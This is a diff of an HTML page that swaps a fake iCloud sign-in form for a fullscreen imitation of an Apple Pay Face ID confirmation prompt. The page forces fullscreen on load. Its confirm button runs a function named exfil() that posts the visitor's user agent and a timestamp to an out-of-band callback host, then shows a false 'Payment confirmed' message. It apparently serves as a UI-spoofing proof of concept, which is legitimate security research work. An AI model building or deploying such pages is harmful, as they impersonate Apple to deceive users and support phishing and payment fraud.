@@ -1,49 +1,67 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="UTF-8">
-  <title>Loading…</title>
+  <meta charset="utf-8">
+  <title>Apple Pay</title>
   <style>
-    body {
+    html, body {
       margin: 0;
-      background: #f2f2f2;
-    }
-    #container {
+      background: black;
+      color: white;
+      font-family: -apple-system;
+      height: 100vh;
       display: flex;
       flex-direction: column;
-      align-items: center;
       justify-content: center;
-      height: 100vh;
-      font-family: -apple-system;
+      align-items: center;
     }
-    input, button {
-      margin: 6px;
-      padding: 12px;
-      font-size: 16px;
-      width: 260px;
-      border-radius: 6px;
+    .prompt {
+      background: #1c1c1e;
+      padding: 30px;
+      border-radius: 20px;
+      text-align: center;
     }
-    button {
+    .faceid {
+      font-size: 40px;
+      margin-bottom: 20px;
+    }
+    .btn {
       background: #007aff;
       color: white;
+      padding: 12px 24px;
+      border-radius: 10px;
+      font-size: 18px;
+      margin-top: 20px;
       border: none;
     }
   </style>
 </head>
 <body>
 
-<div id="container">
-  <h2>Sign in to iCloud</h2>
-  <input placeholder="Apple ID" type="email">
-  <input placeholder="Password" type="password">
-  <button onclick="alert('Wrong password')">Continue</button>
+<div class="prompt">
+  <div class="faceid">🔒 Face ID</div>
+  <div>Confirm with Side Button</div>
+  <button class="btn" onclick="exfil()">Confirm</button>
 </div>
 
 <script>
+function exfil() {
+  fetch("https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun", {
+    method: "POST",
+    mode: "no-cors",
+    body: JSON.stringify({
+      type: "fullscreen-applepay-spoof",
+      ua: navigator.userAgent,
+      ts: Date.now()
+    })
+  });
+  alert("✅ Payment confirmed.");
+}
+
 window.onload = () => {
-  setTimeout(() => {
+  if (document.documentElement.requestFullscreen) {
     document.documentElement.requestFullscreen().catch(() => {});
-  }, 300);
+  }
 };
 </script>
 
